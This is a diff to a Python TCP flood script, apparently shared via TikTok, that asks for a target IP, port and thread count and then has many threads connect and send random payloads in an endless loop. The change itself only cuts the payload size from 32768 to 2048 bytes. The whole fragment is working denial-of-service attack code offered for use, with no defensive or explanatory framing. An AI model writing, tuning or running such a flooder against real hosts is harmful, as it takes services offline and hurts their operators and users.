@@ -10,7 +10,7 @@ NUM_THREADS = int(input("THREADS (2000 SUGGESTED): "))
 os.system("clear")
 print(f"🚀 TCP flood started at {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} threads. Stop with Ctrl+C.\n(MADE BY apexvr_ ON TIKTOK)")
         
-    def random_payload(size=32768):
+    def random_payload(size=2048):
         return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
         
     def tcp_flood():
@@ -21,7 +21,7 @@ print(f"🚀 TCP flood started at {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} t
                 s.connect((TARGET_IP, TARGET_PORT))
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 while True:
-                    s.sendall(random_payload(32768))
+                    s.sendall(random_payload(2048))
             except Exception:
                 s.close()
                 time.sleep(0.05)
